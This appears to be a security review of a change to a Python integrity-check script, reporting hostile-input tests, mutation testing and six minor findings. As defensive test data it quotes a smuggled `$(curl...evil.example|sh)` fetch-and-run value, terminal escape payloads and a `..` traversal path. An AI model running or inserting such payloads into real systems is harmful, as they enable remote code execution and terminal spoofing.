**The security obligation clears.** I tried to make the new slot note change the check's pass-or-fail result, hang, print a raw control character or print a command of its own, and I tried to slip a vendor name past the stricter checker. None of it worked.

* On 24 hostile trees and a real install (passing and broken), the old check (`bb4f710a`) and the new one give the same exit code and the same report, apart from the note's own lines. Every note line is plain printable text; escape characters show as `\x1b` and the like.
* Special files and swaps are refused, and nothing hangs: a pipe (FIFO), a socket, a folder, a symlink, or a file swapped for a symlink or a FIFO after the path check.
* The comment edits to the interpreter-binding script change no code. All 54 of its functions are identical apart from two docstring lines, and the two copies are byte-identical.
* No marker inside `templates/` can hide a name: all 19 marker and file-type plants were caught.

**Three small fixes are worth making. None blocks.**

1. **NU-CSR1.** The new size limit on token substitution applies to each slot, not each file. A crafted lockfile and 750 KB of files made the check take 8.4 seconds instead of 0.07, and the time grows with the number of lockfile entries.
2. **NU-CSR2.** The check now holds every accepted file in memory until the note runs. Twelve 40 MB files took 536 MB instead of 112 MB.
3. **NU-CSR3.** One of the reader's guards (it refuses `..` in a base-copy path) has no test. Removing it breaks no test, and then the note reads a file outside the project.

There are also three wording points (NU-CSR4 to NU-CSR6). Both resource findings need someone to change the lockfile, which review sees. Both fail toward a slow or failed run, never a false pass.

Status moves to `revising-code`, because NU-CSR1 to NU-CSR3 change code or tests. If the revision touches only the lines those findings name, no second Security Review is owed for them. A changed implementation byte still voids the Boundary B record, so a fresh run is owed (`AGENTS.md`, Boundary C).

### What I ran

Every run used `/Users/kendal30/conda_envs/lhm/bin/python3.13` (Python 3.13.13) on macOS. The trees were detached `git worktree`s of `afbb1f23` and `bb4f710a` in a fresh, empty scratch folder of my own, plus `git archive` extractions for the mutants and the gate plants; the shared tree was never touched. In my scratch worktree I placed the parent's verifier beside the new one, under the name `verify_integrity_parent.py`, so both run on the same engine. The two blobs I read are the ones the implementation record tested: `verify_integrity.py` `4376f4bd`, the test file `607ab83c`.

**1. Hostile trees, old against new.** Each tree was built with the suite's record shape. Both verifiers ran as `python <file> --target <tree>`, and I compared exit code, stdout, and stderr with the `slot note:` lines removed.

| Tree | Old exit | New exit | Same report | What the note did |
|---|---|---|---|---|
| escape bytes (ESC, BEL, newline, right-to-left mark) in a path and a slot name | 0 | 0 | yes | listed it as `'evil\x1b[31mRED...\n...‮RTL.md' slot '\x1b]0;pwned\x07\x1b[2J'`; 0 non-printable note lines |
| escape bytes and `$(...)` in a token value | 0 | 0 | yes | values are never printed |
| NUL bytes in slot bodies | 0 | 0 | yes | parsed as text |
| 6,000 nested openers then 6,000 closers, cap-sized | 0 | 0 | yes | 0.09 s |
| `<!--` followed by a cap of whitespace | 0 | 0 | yes | 0.09 s |
| a cap of unclosed 200-character slot names | 0 | 0 | yes | 0.10 s |
| one slot, one token value just under the cap | 0 | 0 | yes | built, compared |
| 4,000 slots in one file, each body one near-cap token | 0 | 0 | yes | 0.48 s (NU-CSR1) |
| 3,000 records | 0 | 0 | yes | 0.51 s against 0.35 s; 3,003 note lines (the recorded "no line cap" omission) |
| a record that is a string; `files` that is a mapping | 1 | 1 | same crash | `AttributeError` at the same loop line in both, before any verdict |
| 200,000 tokens | 0 | 0 | yes | 0.18 s |
| `verbatim: "false"` (a non-empty string, so true) | 0 | 0 | yes | not read |
| `living_state: "no"` on a living-state path | 0 | 0 | yes | read as living state, as the loop treats it |
| the same record twice | 0 | 0 | yes | counted twice |
| eleven `base_cache` shapes | 0 | 0 | yes | the `./` and `//` forms normalize into `dev/.cairn/base/` and are read; absolute, `..`, the folder itself, the lockfile, empty, an upper-case prefix, a list, a mapping and `true` are "unreadable" |
| a living-state file hard-linked to a file outside the project | 0 | 0 | yes | read and listed (see the swaps below) |
| a FIFO at an accepted path | 1 | 1 | yes | the integrity pass reports `missing`, as before |
| a FIFO, a socket, or a no-permission file at a living-state path | 0 | 0 | yes | "unreadable", 0.10 s |
| a modified file with a customized slot and a planted line | 1 | 1 | yes | counted "failed the integrity check"; no command on a note line |
| twelve 40 MB hash-matching files | 0 | 0 | yes | peak memory 112 MB to 536 MB (NU-CSR2) |
| a fresh `solo-greenfield` install; the same with a planted line in `AGENTS.md` | 0; 1 | 0; 1 | yes | 20 placeholders listed, and 16 once `AGENTS.md` fails; report first in a merged stream |

**2. Swaps between the path check and the open.** I wrapped `os.open` so it swaps the path just before the real call.

* A living-state file swapped for a symlink is refused (`O_NOFOLLOW`). Swapped for a FIFO, it is refused (not a regular file) and does not hang. The same two swaps on a base copy are refused too; my first harness hit those by accident.
* A base copy's parent folder swapped for a link to an outside folder: the outside file is read, then rejected by `base_hash`.
* A living-state file's parent folder swapped for a link to an outside folder: the outside file is read and its content decides one listing, but the name printed comes from the hash-checked base copy. A hard link reaches outside the same way, with no race, because the walk checks for symlinks, not hard links. Both are the residual S5 names, and harmless for the reason S5 gives. Walking by directory descriptors (`os.open(..., dir_fd=...)`) would close both, but it needs a platform branch in a trust anchor. I do not recommend it.

**3. Streams.**

* Merged stdout and stderr: on both real trees the report comes before the first `slot note:` line.
* Stderr to a closed pipe: a passing run exits 0 before and 120 now, as C10 documents; a failing run exits 120 in both. Stdout to a closed pipe: 120 in both.
* With file descriptor 2 closed (`2>&-`), the note's lines land on stdout, as the old report's lines already do, because Python prints to stdout when `sys.stderr` is `None`. The exit code is unchanged.
* With file descriptor 1 closed, the note prints `slot note: not run (AttributeError)`: the flush meets a `None` stdout and the fence catches it. Harmless.
* No shipped program parses this check's output (`git grep`: only tests call `verify()`), so the new stderr text cannot change another tool's decision.

**4. "Prints no commands."** I listed the print sites from the tree (`bootstrap/verify_integrity.py:315`, `:317`, `:324`, `:327`, `:345`). Each prints fixed text, a count, a value passed through `ascii()`, or an exception type name reduced to `[A-Za-z0-9_?]`. The note's own words name no command. Tree text can still spell one inside quotes; NU-CSR5.

**5. C2, the interpreter binding.**

* The plan's ten-function script reads **SAME** for both copies, against `b13ad7b7` and against `01d21423`'s parent `ef08e2a4`. K2's whole-module script also reads SAME.
* My own comparison covers all 54 functions. The full dump differs only for `cmd_session_start` and `cmd_session_end`, and the docstring-stripped dump differs for none. Controls: one added statement in `_resolve_interpreter` is flagged, and one in `cmd_session_start` is flagged.
* The diff is three hunks: a `#:` comment at `:215-217`, and one docstring line each at `:905` and `:1338`. Nothing in the file reads `__doc__` or `getdoc`. No `nosec`, `noqa`, `pragma`, `type:` or encoding line is added or removed in any `.py` file of `01d21423`, and no file mode changes. All 20 `.py` files in that commit read SAME.
* `cmp` exits 0 for the `session.py` pair, and also for `content_scan.py`, `intent.py`, `onboarding_activate.py`, the six `_onboarding` modules and `vendor_targets.yml`. The control pair differs.
* `01d21423` is the only commit in `bb4f710a..afbb1f23` that touches either copy. The shared working tree holds another session's uncommitted edits to both; I read committed bytes only.

**6. C1, the gate.** Each plant was added alone to a clean extraction of `afbb1f23`; the control reads `fail=0 info=56`.

| Plant in `templates/core/` | `fail=` |
|---|---|
| same-line `vendor-ok` on a name; upper-case `VENDOR-OK`; a name in a whole-line HTML comment, a code fence, a `.py` comment, a `.py` docstring, a `.json` key, a `.yml` comment, a `.txt`; `Claude's`; CRLF lines; invalid UTF-8 beside a name | 1 each |
| own-line `vendor-ok` above a name; `vendor-ok :` with a space; an unclosed block marker; a `case-study` marker; a name inside a marker reason | 2 each |
| block markers around a name | 3 |
| the plan's named limits: plural `GPTs`; a `.sh` file; an upper-case `.MD`; an extensionless file; UTF-16; a zero-width joiner inside the name | 0 each |
| a listed name in a file **name** only (`Claude-notes.md`, neutral text) | 0 (NU-CSR6) |

All 97 rows of `scaffold.py --manifest` take their source from under `templates/`. The control, a made-up path, is reported missing. The shipped source types are `.md` 44, `.py` 44, `.json` 3, `.txt` 3, `.yml` 2 and one `.gitkeep`, all read by the gate. No shipped source or destination path contains a listed word, case-insensitive.

**7. My own mutants.** I made 14, each in a fresh extraction, and ran `bootstrap/tests/test_verify_integrity.py` against each. The unmutated control: 122 passed in 4.1 s, and all 19 node IDs collected at `bb4f710a` are still collected.

| Mutant | Result | Killed by |
|---|---|---|
| drop `O_NONBLOCK` | killed | `base_cache-a-fifo` (20 s timeout) |
| drop the per-component symlink walk | killed | `base_cache-symlinked-parent` |
| drop the `dev/.cairn/base/` prefix check | killed | `base_cache-outside-base-dir` |
| drop the `..` check | **survived** | none; not equivalent (NU-CSR3) |
| read the cap instead of cap + 1 | killed | `base-copy-over-the-cap` |
| skip the `base_hash` check | killed | `base_hash-does-not-match` |
| read a living-state file with `Path.read_bytes()` | killed | `living-a-fifo` (timeout) |
| the fence catches `Exception` only | killed | the `SystemExit` test |
| the fence prints the exception's message | killed | `test_an_exception_in_the_note_becomes_one_line_naming_only_its_type` |
| drop the flush | killed | `test_the_report_comes_before_the_note_in_a_merged_stream` |
| failed count off by one | killed | `base_cache-not-a-string` (coverage figures) |
| `str()` instead of `ascii()` for the slot name; for the path | killed, killed | `test_an_unfilled_slot_is_listed` |
| drop the substitution-length bound | killed | `token-value-times-twenty-over-the-cap` |

Also run: `test_security_lint.py` and `test_scaffold_substrate.py`, 29 passed. The reader's one `os.open` and the loop's existing `read_bytes` are the only reads in the file, and no module-level statement names an `os.O_*` flag.

### The baseline: NU-SR1 to NU-SR6 as built

| Finding | Asked for | Built as specified? | Evidence |
|---|---|---|---|
| NU-SR1 | living-state files fed hostile input; one reader; the `read_bytes` mutant; containment named; the race line in S5 | yes | six `living-*` cases in the verdict test, each asserting its coverage; the grep above; my `read_bytes` mutant killed by the FIFO case; D7 and S5 |
| NU-SR2 | substitution bounded; pairing by one pass; a closed-slot linear test with an absolute bound, best of three | partly | `_slots` is one pass plus a name map; `test_closed_slots_on_both_sides_cost_linear_time` asserts `_best_of_three(...) < 0.25`; the bound is per slot, not per file (NU-CSR1) |
| NU-SR3 | the ten functions by name, docstring-stripped for two | yes | re-run above, controls fire |
| NU-SR4 | the loop adds lines only; the failed count after the loop; old against new; the flush; a merged-stream subprocess test; exit 120 named | yes | `git diff -U0 bb4f710a afbb1f23 -- bootstrap/verify_integrity.py` removes no line; the count is taken in `_run_slot_note` (`:338-340`); my 24 trees; flush at `:337`; exit 120 confirmed and documented (wording: NU-CSR4) |
| NU-SR5 | the frozen test adds lines only, with all 19 base nodes collected; phase-mutable files and the oracle's evidence named | yes | 0 removed lines; 19 of 19 collected among 122; `dev/PLANNING.md:252` and *Scope* |
| NU-SR6 | marked lines outside `templates/` named among zero's limits | yes | `doctrine/consolidation-review.md:90`, *In brief* |

**The proposal's SR items, where they touch C8 and C9.**

| Item | Built? |
|---|---|
| SR2 (the base copy is hashed first) | yes: the hash at `:242-245` comes before any decode or parse; the skip-the-hash mutant is killed |
| SR3 (a separate pass after the verdict that never sees the violations, the skipped count or the exit code; regular files only; errors become counts; an unsafe `base_cache` still fails on its own) | yes: the call is the last thing before each `return`; the signature test; `fstat`; the per-record `except`; `test_a_record_with_an_unsafe_base_copy_still_fails_on_its_own` |
| SR4 (`base_hash`, the base-folder containment, the cap, `ascii()`) | yes, with NU-CSR3's missing test |
| SR5 (the marker only to keep Cairn's text; empty slots counted) | yes: the advice at `:312-314`; `base_body.strip()` at `:267` |
| SR9 (living-state files read and counted) | yes |
| SR12 (the seven build details) | yes, apart from the per-file bound (NU-CSR1) |
| SR15 (no printed command) | yes for the note's own words (NU-CSR5) |
| SR16 (the planted-line test reads only the note's lines) | yes: `test_a_first_install_with_a_planted_line_gets_no_command_from_the_note`, and reproduced by my planted-line tree |

### Findings

**[NU-CSR1] (Low, non-blocking) The substitution bound limits each slot, not each file, so a crafted lockfile can make the check slow.**

* **Evidence.**
  * `_substituted` (`bootstrap/verify_integrity.py:207-222`) refuses a body whose substituted length would pass the 256 KiB cap. `_note_file` calls it once per slot (`:262`).
  * A base copy under the cap holds about 4,800 slots, each body one `{{v}}`, and the lockfile's token value can sit just under the cap. Every body then passes, and the note builds about 4,800 x 256 KiB, roughly 1.2 GB of text, for one file.
  * Measured: 50 such files (12 MB on disk) took 21.2 s, against 0.07 s for the parent. Duplicate records are accepted, so one file pair (750 KB) listed 20 times in the lockfile took 8.4 s against 0.07 s, and the time grows with the record count.
  * Memory stays flat, because each string is dropped. The exit code is fixed before the note runs, so this delays the result and never changes it.
  * It needs a lockfile change (tokens, records and `base_hash`), which S5 concedes can already steer the note and which review sees.
  * C9's criterion "Substitution is bounded" is green as written, since its 24th case is one body over the cap. The property NU-SR2 asked for, linear end to end, is not met.
* **Recommended fix.**
  * Give each file one budget: keep a running total of substituted length across the file's slots, pass the remainder into `_substituted`, and count the file "unreadable" once it would pass the cap.
  * Add a hostile case with many near-cap bodies in one file. It must come back "unreadable", fast.
  * Add the mutant "per-slot bound only".

**[NU-CSR2] (Low, non-blocking) The record loop now keeps every accepted file whole until the note runs.**

* **Evidence.**
  * `accepted.append((rec, on_disk))` (`:423`) holds the full bytes of each accepted non-verbatim file for the rest of the loop; the parent dropped them file by file.
  * The note uses the bytes only when the record has a base copy and the file is under the cap (`:248-251`). For everything else they are held for nothing.
  * Measured on twelve 40 MB hash-matching files with no base copy: peak memory 112 MB for the parent, 536 MB for the new check.
  * This is the one place the change adds cost inside the loop that decides the verdict. On a host short of memory, a tree that passed before could now crash, which fails closed. Real non-verbatim records are small Markdown files, so the risk is low. But the plan's promise is that the note cannot change the result, and this is the one route by which it can.
* **Recommended fix.** Keep only what the note can use: `accepted.append((rec, on_disk[:_NOTE_CAP + 1]))`. A file over the cap still reads "unreadable", a file under it is the whole hashed bytes, and the loop stays add-only.

**[NU-CSR3] (Low, non-blocking) The `..` guard in the shared reader has no test.**

* **Evidence.**
  * Removing `".." in path.parts` from `_read_bounded` (`:130`) leaves all 122 tests green.
  * The mutant is not equivalent. Without the guard, a `base_cache` of `dev/.cairn/base/../../../../dotdot-outside.md` passes the prefix check, passes the component walk (a `..` part is a folder, not a link) and opens. The note then reads and uses a file outside the project: the built check reports `unreadable 1`, the mutant `checked 1, listed 1`.
  * The suite's "outside the target" case uses `../outside.md`, which the prefix check refuses first, so it never reaches this guard.
  * The code is right today. A later refactor that drops the guard, believing the prefix check covers it, would go unnoticed. The read is still bound by `base_hash`, so what is lost is containment (SR4), not what is printed.
* **Recommended fix.** Add a hostile case `base_cache-dotdot-after-the-base-prefix` (expect "unreadable"), and add "drop the `..` check" to the mutation ledger.

**[NU-CSR4] (Info) "One edge no code can close" is not accurate.**

* **Evidence.**
  * `bootstrap/UPGRADE.md:108`, with the plan's C10 and S4, says no code can stop a closed stderr pipe from turning a passing run's 0 into 120. The edge itself is confirmed: 0 before, 120 now.
  * On a stand-in with the note's shape, pointing file descriptor 2 at `/dev/null` after the failed write (`os.dup2(os.open(os.devnull, os.O_WRONLY), 2)`) gives exit 0. So code can close it.
  * Keeping the edge is fine: it only turns a pass into a failure.
* **Recommended fix.** Reword to "one edge this check leaves open". I do not recommend the guard: it adds descriptor handling to a trust anchor for a case that already fails safe.

**[NU-CSR5] (Info) "Prints no command" holds for the note's own words, not for tree text it repeats.**

* **Evidence.**
  * The docstring says the note "prints no command" (`:292`), and every print site is fixed text, a count, or a value passed through `ascii()`.
  * But `ascii()` leaves printable text alone, and a project path may contain spaces. One tree's lockfile recorded the path `python bootstrap/scaffold.py upgrade --target . --finalize AGENTS.md` (a folder and a file of those names) and a slot named `$(curl${IFS}-s${IFS}evil.example|sh)`. The note printed: `slot note: 'python bootstrap/scaffold.py upgrade --target . --finalize AGENTS.md' slot '$(curl${IFS}-s${IFS}evil.example|sh)' still holds the text Cairn shipped. ...`
  * Both values sit inside quotes. Getting there takes a lockfile change, and anyone who can change the lockfile can already record a tampered file's hash directly. So this gives an attacker nothing new; the plan's Security Review named it as S5's "changed lockfile" residual.
  * `test_no_line_of_the_note_prints_a_command` pins the note's wording on ordinary names, which is the right scope. The adopter guide makes no "never prints a command" promise.
* **Recommended fix (optional).** Scope the docstring sentence: "It prints no command of its own; a path or slot name from the tree is shown quoted and escaped, and can spell any printable text." No code change.

**[NU-CSR6] (Info) Two limits of "zero" could be stated, or made mechanical, cheaply.**

* **Evidence.**
  * (a) The gate reads file contents, not file or folder names: `templates/core/Claude-notes.md` with neutral text reads `fail=0`. No shipped path contains a listed word today (all 97 manifest rows checked). The stated limits (*In brief*, `doctrine/consolidation-review.md:90`) do not mention names.
  * (b) The gate's `templates` suffix list is a fixed tuple (`scripts/quality_gate.py:456`). A template with another suffix (`.sh`, `.MD`, or none) reads `fail=0`. Every shipped type is on the list today, so nothing is missed now. The gap opens silently the day a new type ships, such as a shell-script hook.
* **Recommended fix.**
  * In the archive's `CHANGELOG.md` entry, which is not yet written, add file and folder names to what zero does not cover.
  * Optionally, add one test that every `scaffold.py --manifest` source suffix is one the gate reads under `templates/`, so a new shipped type fails a test instead of passing unseen.

### Observed outside this change

**The integrity report prints lockfile paths unescaped.** This predates the plan, and the plan's own note does not do it.

* The report's lines at `bootstrap/verify_integrity.py:382-419` (`unsafe dst`, `malformed hash`, `dst escapes`, `illegal living_state`, `missing`, `modified`) and the hint's `--finalize` list (`:462`) put `dst_rel` into the output raw.
* A lockfile path holding `ESC ] 0 ; ... BEL ESC [ 2 J` reached the terminal raw through the `missing:` line, in the parent and in the new check alike. The note itself prints through `ascii()`.
* This is shipped behaviour from before the plan, and it touches the hint, which the plan deliberately leaves alone. It wants its own record (a board row, or a small change with a Security Review), not a widening of this plan. No NU-CSR number, because it is not this change's.

### What I did not cover

* **Linux and Windows.** I ran on macOS only, so `O_NONBLOCK` on a FIFO and `O_NOFOLLOW` on a symlinked leaf were exercised on one platform.
* **The full suite.** Boundary B is the implementer's. I ran `test_verify_integrity.py` (122), `test_security_lint.py` and `test_scaffold_substrate.py` (29).
* **The implementer's 36-mutant ledger.** I did not repeat it; I ran 14 of my own, aimed at the reader, the fence, the order and the printing.
* **Real races.** I forced every swap by wrapping `os.open`; I did not try to win a race against an unmodified process.
* **Rewordings that lost an explanation** (K5) in C3-C5, the one-time name search, the 16-pair twin listing, and the markers' placement. Those are the ordinary code review's. I checked only that the code did not change, and `cmp` on 11 security-relevant pairs.
* **The note's agreement with the engine's marker parsing**, beyond reading the tests that pin it.
* **Unicode look-alikes in vendor names.** That is the plan's named "hiding a name on purpose" limit.
* **Other sessions' uncommitted edits** in the shared tree (including `bootstrap/UPGRADE.md`, `tools/session.py` and `templates/skills/_lib/session.py`). I reviewed committed bytes only.
